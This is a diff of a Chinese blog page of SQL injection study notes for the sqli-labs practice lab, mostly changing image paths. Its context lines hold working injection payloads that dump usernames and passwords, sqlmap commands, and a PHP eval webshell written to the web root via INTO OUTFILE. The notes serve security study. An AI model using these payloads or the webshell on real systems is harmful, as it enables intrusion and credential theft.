@@ -554,11 +554,11 @@
 <h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。</p>
 <p>例如：过滤了union，我们可以使用ununionion进行绕过。</p>
 <h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>可以利用网络中的URL在线编码，绕过SQL注入的过滤机制。</p>
-<img src="\SQL注入知识点总结-靶场笔记\QQ截图20200206143207.png" style="zoom:80%;" />
+<img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ截图20200206143207.png" style="zoom:80%;">
 
 <hr>
 <h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>在Mysql中内联注释中的内容可以被当做SQL语句执行。</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206143914.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206143914.png" alt></p>
 <h4 id="sqlmap基础使用方法"><a href="#sqlmap基础使用方法" class="headerlink" title="sqlmap基础使用方法"></a>sqlmap<strong>基础使用方法</strong></h4><h5 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a><strong>sqlmap简介</strong></h5><p>​       sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p>
 <p>​         sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
 <p>sqlmap支持五种不同的注入模式：</p>
@@ -609,25 +609,25 @@
 <p>?id=1’ union select 1,2,3 #显示位为2，3</p>
 <p><strong>爆库名</strong></p>
 <p>?id=1’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23 </p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184721.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184721.png" alt></p>
 <p><strong>爆表名</strong></p>
 <p>?id=1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)%23 </p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184704.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184704.png" alt></p>
 <p><strong>爆列名</strong></p>
 <p>?id=1’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’user’) %23 </p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184647.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184647.png" alt></p>
 <p><strong>爆用户名和密码</strong></p>
 <p>?id=1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23  </p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205184623.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205184623.png" alt></p>
 <p><strong>使用sqlmap自动化探测</strong></p>
 <p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs --batch</code></p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205190036.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205190036.png" alt></p>
 <p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</code></p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205190557.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205190557.png" alt></p>
 <p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --batch</code></p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205190649.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205190649.png" alt></p>
 <p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C password,username --dump --batch</code></p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205192706.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205192706.png" alt></p>
 <h5 id="Less-2-（基于错误的GET整型注入）"><a href="#Less-2-（基于错误的GET整型注入）" class="headerlink" title="Less-2 （基于错误的GET整型注入）"></a>Less-2 （基于错误的GET整型注入）</h5><p>数字型注入，去掉单引号即可。</p>
 <p>构造同Less-1</p>
 <h5 id="Less-3-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3 （基于错误的GET单引号变形字符型注入）"></a>Less-3 （基于错误的GET单引号变形字符型注入）</h5><p>?id=1’) %23 回显正常</p>
@@ -636,39 +636,39 @@
 <p>构造同Less-01</p>
 <h5 id="Less-5（双注入GET单引号字符型注入）"><a href="#Less-5（双注入GET单引号字符型注入）" class="headerlink" title="Less-5（双注入GET单引号字符型注入）"></a>Less-5（双注入GET单引号字符型注入）</h5><p><strong>爆库名</strong></p>
 <p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select database()),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206132510.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206132510.png" alt></p>
 <p><strong>爆表名</strong></p>
 <p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206132607.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206132607.png" alt></p>
 <p><strong>更换Limit后的数字即可查出其他表名</strong></p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206132652.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206132652.png" alt></p>
 <p><strong>爆user表列名</strong></p>
 <p>?id=1’  union select count(*),1, concat(‘<del>‘,(select column_namefrom information_schema.tables where table_schema=’security’   and table_name=’users’ limit 0,1),’</del>‘,floor(rand()2)) as a from information_schema gruop by a %23</p>
 <p><strong>爆username password内容</strong></p>
 <p> ?id=1’union select count(<em>),1, concat(‘<del>‘,(select username from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206133237.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206133237.png" alt></p>
 <p>?id=1’union select count(<em>),1, concat(‘<del>‘,(select password from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a  %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206133320.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206133320.png" alt></p>
 <h5 id="Less-6-双注入GET双引号字符型注入）"><a href="#Less-6-双注入GET双引号字符型注入）" class="headerlink" title="Less-6 (双注入GET双引号字符型注入）"></a>Less-6 (双注入GET双引号字符型注入）</h5><p>将单引号换成双引号即可</p>
 <p>构造同上</p>
 <h5 id="Less-7-导出文件GET字符型注入）"><a href="#Less-7-导出文件GET字符型注入）" class="headerlink" title="Less-7(导出文件GET字符型注入）"></a>Less-7(导出文件GET字符型注入）</h5><p>我们首先需要打开phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv=“/”。</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206122518.png" alt=""></p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206120820.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206122518.png" alt></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206120820.png" alt></p>
 <p>我们需要用到两个函数：</p>
 <p><strong>load_file()：</strong>读取本地文件</p>
 <p><strong>into outfile()</strong> 写文件 （路径需要使用双斜线）</p>
 <p>我们首先判断注入点：</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206121046.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206121046.png" alt></p>
 <p>然后我们使用outfile函数将一句话木马写入文件。</p>
 <pre class=" language-mysql"><code class="language-mysql">?id=-1')) union select 1,2,'<?php @eval($_POST["crow"]);?>' into outfile "D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php"</code></pre>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206123636.png" alt=""></p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206123628.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206123636.png" alt></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206123628.png" alt></p>
 <p>之后我们使用中国菜刀连接即可。 </p>
 <h5 id="Less-8-基于布尔的盲注）"><a href="#Less-8-基于布尔的盲注）" class="headerlink" title="Less-8 (基于布尔的盲注）"></a>Less-8 (基于布尔的盲注）</h5><p><strong>爆数据库长度</strong></p>
 <p>?id=1’ and (length(database())) = 8 %23 #数据库长度为8</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205195014.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205195014.png" alt></p>
 <p>我们任意修改长度，页面不回显</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205195102.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205195102.png" alt></p>
 <p><strong>爆库名</strong></p>
 <p>?id=1’ and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</p>
 <p>?id=1’and(ascii(substr((select database()),2,1)))=101 %23 #e</p>
@@ -682,9 +682,9 @@
 <p>?id=1’ and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</p>
 <p>类推以上即可：</p>
 <h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p>?id=1’ and sleep(5) %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205194242.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205194242.png" alt></p>
 <p>?id=1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200205194753.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205194753.png" alt></p>
 <p>接下来使用sqlmap自动化注入</p>
 <p><strong>爆数据库名：</strong></p>
 <pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql --dbs --batch</code></pre><p><strong>爆表名：</strong></p>
@@ -694,22 +694,22 @@
 <p>同上</p>
 <h5 id="Less-11-基于错误的POST型单引号字符型注入）"><a href="#Less-11-基于错误的POST型单引号字符型注入）" class="headerlink" title="Less-11(基于错误的POST型单引号字符型注入）"></a>Less-11(基于错误的POST型单引号字符型注入）</h5><p>提交方式改为POST，使用burp进行抓包修改。</p>
 <p>uname=admin’ and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206125708.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206125708.png" alt></p>
 <p>uname=admin’ and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt></p>
 <p>存在报错型注入，我们使用extractvalue()函数。</p>
 <p><strong>爆数据库</strong></p>
 <p>uname=admin’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130037.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130037.png" alt></p>
 <p><strong>爆表名</strong></p>
 <p>uname=admin’ and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130124.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130124.png" alt></p>
 <p><strong>爆列名</strong></p>
 <p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=’users’),0x7e))%23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130709.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130709.png" alt></p>
 <p><strong>爆用户名密码</strong></p>
 <p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p>
-<p><img src="%5CSQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%5CQQ%E6%88%AA%E5%9B%BE20200206130537.png" alt=""></p>
+<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130537.png" alt></p>
 <p>sqlmap自动化注入：</p>
 <p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用Sqlmap -r 文件路径 -p 指定探测参数。</p>
 <h5 id="Less-12-基于错误的双引号POST型字符型变形的注入）"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入）" class="headerlink" title="Less-12(基于错误的双引号POST型字符型变形的注入）"></a>Less-12(基于错误的双引号POST型字符型变形的注入）</h5><p><strong>换成双引号即可；</strong></p>
@@ -970,30 +970,42 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/">
+                <a href="/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="SQL注入知识点总结+靶场笔记">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="渗透测试——主动信息收集">
                         
-                        <span class="card-title">SQL注入知识点总结+靶场笔记</span>
+                        <span class="card-title">渗透测试——主动信息收集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQL注入漏洞学习笔记+靶场总结mysql相关知识点Mysql 5.x数据结构​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata
+                            主动信息收集部分主动信息收集
+直接与目标主机交互
+
+无法避免留下发文的痕迹；
+
+使用受控的第三方电脑进行探测；
+
+使用代理或者已经被控制的主机
+
+做好被封杀的准备
+
+使用噪音迷惑目标，淹没真实的探测流量
+
+扫描-发送不同的探测，根据返回结果
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-12
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-12
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1002,7 +1014,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -1187,7 +1198,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">4k</span>&nbsp;字
+                class="white-color">15k</span>&nbsp;字
             
             
             
